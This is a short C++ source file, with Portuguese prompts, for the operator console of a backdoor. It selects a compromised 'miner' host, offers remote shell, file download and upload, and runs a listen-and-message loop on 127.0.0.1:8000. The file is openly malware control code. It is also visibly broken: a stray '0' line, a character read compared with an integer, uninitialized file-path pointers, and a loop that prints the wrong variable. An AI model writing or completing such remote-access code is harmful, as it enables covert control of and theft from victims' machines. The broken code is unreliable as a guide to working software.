#include "communication.h"
#include "backdoor.h"
#define IP "127.0.0.1"
#define PORT 8000

void operar(Backdoor b){
    int choice;
    std::cout << "MINER_ID = " << b.get_miner_id() << "IP = \n" << b.get_miner_ip() << std::endl;
0
    std::cout << "Operações : " << std::endl;

    std::cout << "1) Shell\n2) Download\n3)Upload" << std::endl;

    choice = std::cin.get();


    if(choice == 1){
        b.shell();
    
    }else if(choice == 2){
        char * path;
        b.download(path);


    }else if(choice == 3){
        char *path;
    
        b.upload(path);
    
    }else{
        std::cout << "Comando inválido" << std::endl;
    }
}


int main(int argc, char *argv[]){
    char * s = "Hello world";
    Backdoor b(IP, PORT, true);

    std::vector<Backdoor> conexoes;
    conexoes.push_back(b);
    int i = 0, choice;

    std::cout << "Choose Miner: " << std::endl;
    for (Backdoor back : conexoes){

        std::cout << i << " - " << b.get_miner_id() << " - ";
        std::cout << b.get_miner_ip() << std::endl;
        choice = std::cin.get();
    }

    operar(conexoes[choice]);


    Communication c(IP, PORT);
    bool isalive = true;

    while(true){
        c.listen_forever();
        std::cout << "Connected" << std::endl;

        while(isalive){
            isalive = 1;
            c.send_message(s);
            c.recv_message();
        }
    }

}